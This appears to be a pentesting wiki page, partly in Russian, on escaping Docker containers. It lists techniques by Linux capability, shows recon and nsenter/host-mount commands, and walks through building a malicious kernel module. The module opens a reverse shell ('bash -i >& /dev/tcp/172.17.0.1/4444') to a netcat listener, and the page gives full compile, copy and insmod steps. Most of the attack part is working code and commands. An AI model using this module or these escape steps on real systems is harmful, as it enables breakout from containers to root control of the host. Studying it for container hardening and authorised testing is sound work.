# Docker Escape

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

| **ID** | **Techniques Name**              | **Minimal Linux Capabilities**   |
| ------ | -------------------------------- | -------------------------------- |
| 1      | Mount the host filesystem        | SYS\_ADMIN                       |
| 2      | Use a mounted docker socket      | No capability is required        |
| 3      | Process Injection                | SYS\_PTRACE                      |
| 4      | Adding a malicious kernel module | SYS\_MODULE                      |
| 5      | Reading secrets from the host    | DAC\_READ\_SEARCH                |
| 6      | Overriding files on host         | DAC\_READ\_SEARCH, DAC\_OVERRIDE |
| 7      | Abusing notify on release        | SYS\_ADMIN, DAC\_OVERRIDE        |

### Recon <a href="#privileged--hostpid" id="privileged--hostpid"></a>

Once we are in the container, we can perform capability discovery to determine which privileges are allowed in the container. The container capabilities can be viewed by reading the content of the main container process (PID = 1) status from within the container:&#x20;

```bash
root@2416b7f009ee:/proc grep Cap /proc/1/status
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
```

* `CapInh` — Inheritable capabilities (унаследованные привилегии).
* `CapPrm` — Permitted capabilities (разрешенные привилегии).
* `CapEff` — Effective capabilities (эффективные привилегии).
* `CapBnd` — Bounding capabilities (ограничивающие привилегии).
* `CapAmb` — Ambient capabilities (окружающие привилегии).

**Decode**:

```bash
capsh --decode=00000000a80425fb
```

### Privileged + hostPID <a href="#privileged--hostpid" id="privileged--hostpid"></a>

With these permissions you can just **move to the namespace of a process running in the host as root** like init (pid:1) just running:&#x20;

`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

### Docker socket

```sh
#default path to docker socket
ls -la /var/run/docker.sock

#search sockets
find / -name "*.sock"
```

### Arbitrary Mounts

```bash
docker run --rm -it -v /:/host ubuntu bash
```

### Побег из контейнера используя CAP\_SYS\_MODULE

Создадим два файла: `reverse_shell.c` и `Makefile`

Содержимое файла `reverse_shell.c`:

```c
#include <linux/kmod.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
static char command[50] = "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1";
char* argv[] = {"/bin/bash","-c", command, NULL};
static char* envp[] = {"HOME=/",NULL};
static int __init connect_back_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit connect_back_exit(void){
printk(KERN_INFO "Exiting\n");
}
module_init(connect_back_init);
module_exit(connect_back_exit);

MODULE_LICENSE("GPL");
```

**Большое пояснение**&#x20;

_Данный модуль ядра вызывает программу пространства пользователя /bin/bash из ядра с помощью call\_usermodehelper. argv — это список аргументов в массиве. Первый элемент — это программа (/bin/bash), которое мы хотим выполнить, и за ней следует список аргументов. Последний элемент является терминатором NULL, который указывает на конец списка._

_envp — следующая необходимая переменная. Это массив окружения, представляющий собой список параметров, определяющий среду выполнения для приложения пользовательского пространства. В этом примере мы определили один параметр HOME для оболочки, и этот список заканчивается терминирующей записью NULL, как и argv._

_Последний аргумент call\_usermodehelper — UMH\_WAIT\_EXEC. Это необходимо для того, чтобы указать, что запрашивающий хочет дождаться запуска приложения пользовательского пространства, но не завершить его._

_Наконец, мы используем IP-адрес 172.17.0.1 в качестве IP-адреса прослушивателя, поэтому этот модуль попытается сделать обратное подключение к этому IP-адресу через порт 4444. Данный ip-адрес может отличаться, но в моем случае это 172.17.0.1. Проверить ваш ip-адрес интерфейса docker0 можно командой ip a или ifconfig docker0._

**Конец большого пояснения**

Содержимое `Makefile`:

```
test@test:~/revershell_module$ cat Makefile 
obj-m += reverse_shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
```

Запустите команду make в репозитории, на выходе вы должны получить .ko файл.

Запустите контейнер с --privileged флагом в deteached режиме и скопируйте туда .ko файл:

```bash
docker run --privileged -itd alpine
test@test:~/revershell_module$ docker cp  reverse_shell.ko friendly_elion:.
Preparing to copy...
Copying to container - 32.77kB
Copying to container - 64.51kB
Successfully copied 64.51kB to friendly_elion:.
```

Запустите еще один терминал и начните прослушивание на порту 4444 с помощью утилиты netcat:

```bash
nc -lvp 4444 Listening on 0.0.0.0 4444
```

А теперь самое время загрузить наш модуль ядра внутри контейнера :)

```bash
insmod reverse_shell.ko
```
